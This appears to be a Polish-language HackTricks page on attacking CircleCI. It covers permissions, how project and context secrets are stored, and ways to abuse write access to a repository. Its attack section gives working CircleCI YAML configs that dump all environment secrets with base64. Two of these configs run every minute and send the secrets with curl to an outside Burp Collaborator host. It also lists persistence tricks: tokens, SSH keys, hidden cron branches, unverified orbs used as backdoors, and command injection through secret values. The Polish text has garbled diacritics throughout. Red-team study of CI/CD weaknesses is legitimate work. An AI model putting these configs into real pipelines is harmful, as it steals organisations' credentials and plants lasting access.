# Bezpieczestwo CircleCI

<details>

{% hint style="success" %}
Dowiedz si i wicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz si i wicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}

## Podstawowe informacje

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) to platforma do **cigej integracji**, gdzie mo偶esz **definiowa szablony** wskazujce, co chcesz, aby zrobia z pewnym kodem i kiedy to zrobi. W ten spos贸b mo偶esz **automatyzowa testowanie** lub **wdro偶enia** bezporednio **z gazi g贸wnej repozytorium** na przykad.

## Uprawnienia

**CircleCI** **dziedziczy uprawnienia** z githuba i bitbucketa zwizane z **kontem**, kt贸re si loguje.\
W moich testach sprawdziem, 偶e o ile masz **uprawnienia do zapisu w repozytorium na githubie**, bdziesz m贸g **zarzdza ustawieniami projektu w CircleCI** (ustawia nowe klucze ssh, pobiera klucze api projektu, tworzy nowe gazie z nowymi konfiguracjami CircleCI...).

Jednak偶e, musisz by **administratorem repozytorium**, aby **przeksztaci repozytorium w projekt CircleCI**.

## Zmienne rodowiskowe i Sekrety

Zgodnie z [**dokumentacj**](https://circleci.com/docs/2.0/env-vars/) istniej r贸偶ne sposoby **adowania wartoci do zmiennych rodowiskowych** w ramach przepywu pracy.

### Wbudowane zmienne rodowiskowe

Ka偶dy kontener uruchomiony przez CircleCI bdzie zawsze mia [**okrelone zmienne rodowiskowe zdefiniowane w dokumentacji**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) takie jak `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` lub `CIRCLE_USERNAME`.

### Tekst czysty

Mo偶esz je zadeklarowa w tekcie czystym wewntrz **polecenia**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Mo偶esz je zadeklarowa w czystym tekcie wewntrz **rodowiska uruchomieniowego**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Mo偶esz je zadeklarowa w czystym tekcie wewntrz **rodowiska build-job**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Mo偶esz zadeklarowa je w czystym tekcie wewntrz **rodowiska kontenera**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Tajne projekty

To s **sekrety**, kt贸re bd dostpne tylko dla **projektu** (dla **dowolnej gazi**).\
Mo偶esz je zobaczy zadeklarowane w _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
Funkcjonalno "**Importuj zmienne**" pozwala na **importowanie zmiennych z innych projekt贸w** do tego.
{% endhint %}

### Tajne kontekstu

To s tajne informacje, kt贸re s **og贸lnodostpne dla organizacji**. Domylnie **ka偶de repozytorium** bdzie miao dostp do dowolnego tajnego przechowywanego tutaj:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Nale偶y jednak zauwa偶y, 偶e mo偶na **wybra inn grup (zamiast Wszyscy czonkowie)**, aby udzieli dostpu do tajnych informacji tylko okrelonym osobom.\
Obecnie jest to jedna z najlepszych metod **zwikszenia bezpieczestwa tajnych informacji**, aby nie pozwala ka偶demu na dostp do nich, ale tylko wybranym osobom.
{% endhint %}

## Ataki

### Wyszukiwanie jawnie zapisanych tajemnic

Jeli masz **dostp do VCS** (takiego jak github), sprawd藕 plik `.circleci/config.yml` w **ka偶dym repozytorium na ka偶dej gazi** i **szukaj** potencjalnych **jawnie zapisanych tajemnic** przechowywanych tam.

### Zmienne rodowiskowe tajnych informacji i wyliczanie kontekstu

Sprawdzajc kod, mo偶esz znale藕 **wszystkie nazwy tajnych informacji**, kt贸re s **u偶ywane** w ka偶dym pliku `.circleci/config.yml`. Mo偶esz tak偶e uzyska **nazwy kontekst贸w** z tych plik贸w lub sprawdzi je w konsoli internetowej: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Wyciek tajnych informacji projektu

{% hint style="warning" %}
Aby **wyciec wszystkie** tajne informacje projektu i kontekstu, wystarczy mie **uprawnienia DO ZAPISU** do **tylko 1 repozytorium** w caej organizacji github (_i twoje konto musi mie dostp do kontekst贸w, ale domylnie ka偶dy mo偶e uzyska dostp do ka偶dego kontekstu_).
{% endhint %}

{% hint style="danger" %}
Funkcjonalno "**Importuj zmienne**" pozwala na **importowanie zmiennych z innych projekt贸w** do tego. Dlatego atakujcy m贸gby **zaimportowa wszystkie zmienne projektowe ze wszystkich repozytori贸w** a nastpnie **wyciec wszystkie razem**.
{% endhint %}

Wszystkie tajne informacje projektu zawsze s ustawione w rodowisku zada, wic po prostu wywoanie env i zaszyfrowanie go w base64 spowoduje wyciek tajnych informacji w **konsoli dziennika prac** w **interfejsie webowym workflows**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Jeli **nie masz dostpu do konsoli internetowej**, ale masz **dostp do repozytorium** i wiesz, 偶e jest u偶ywany CircleCI, mo偶esz po prostu **utworzy przepyw pracy**, kt贸ry jest **uruchamiany co minut** i **wyprowadza tajne informacje do zewntrznego adresu**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Wyciekaj tajemnice kontekstu

Musisz **okreli nazw kontekstu** (to spowoduje r贸wnie偶 wyciek projektowych tajemnic):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Jeli **nie masz dostpu do konsoli internetowej**, ale masz **dostp do repozytorium** i wiesz, 偶e jest u偶ywany CircleCI, mo偶esz po prostu **zmodyfikowa prac**, kt贸ra jest **uruchamiana co minut** i **wycieka tajne informacje do zewntrznego adresu**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Po prostu utworzenie nowego pliku `.circleci/config.yml` w repozytorium **nie wystarczy, aby uruchomi proces budowania w CircleCI**. Musisz **wczy go jako projekt w konsoli CircleCI**.
{% endhint %}

### Ucieczka do Chmury

**CircleCI** daje Ci opcj uruchamiania **swoich proces贸w budowania na ich maszynach lub na Twoich wasnych**.\
Domylnie ich maszyny znajduj si w GCP, i pocztkowo nie bdziesz w stanie znale藕 nic istotnego. Jednak jeli ofiara uruchamia zadania na **swoich wasnych maszynach (potencjalnie w rodowisku chmurowym)**, mo偶esz znale藕 **punkt kocowy metadanych chmury z ciekawymi informacjami**.

Zauwa偶, 偶e w poprzednich przykadach wszystko byo uruchamiane wewntrz kontenera Docker, ale mo偶esz tak偶e **poprosi o uruchomienie maszyny wirtualnej VM** (kt贸ra mo偶e mie inne uprawnienia chmurowe):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
lub nawet kontener Docker z dostpem do zdalnej usugi Docker:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Wytrwao

* Mo偶liwe jest **utworzenie token贸w u偶ytkownika w CircleCI** w celu uzyskania dostpu do punkt贸w kocowych API z uprawnieniami u偶ytkownika.
* _https://app.circleci.com/settings/user/tokens_
* Mo偶liwe jest **utworzenie token贸w projekt贸w** w celu uzyskania dostpu do projektu z uprawnieniami nadanymi tokenowi.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Mo偶liwe jest **dodanie kluczy SSH** do projekt贸w.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Mo偶liwe jest **utworzenie zadania cron w ukrytej gazi** w nieoczekiwanym projekcie, kt贸ry **wycieka** wszystkie **zmienne rodowiskowe kontekstu** codziennie.
* Lub nawet utworzenie w gazi / zmodyfikowanie znanego zadania, kt贸re bdzie **wycieka** wszystkie konteksty i **sekrety projekt贸w** codziennie.
* Jeli jeste wacicielem githuba, mo偶esz **zezwoli na niezweryfikowane orby** i skonfigurowa je w zadaniu jako **tyln furtk**
* Mo偶esz znale藕 **podatno na wstrzykiwanie polece** w pewnym zadaniu i **wstrzykn polecenia** za pomoc **sekretu**, zmieniajc jego warto.
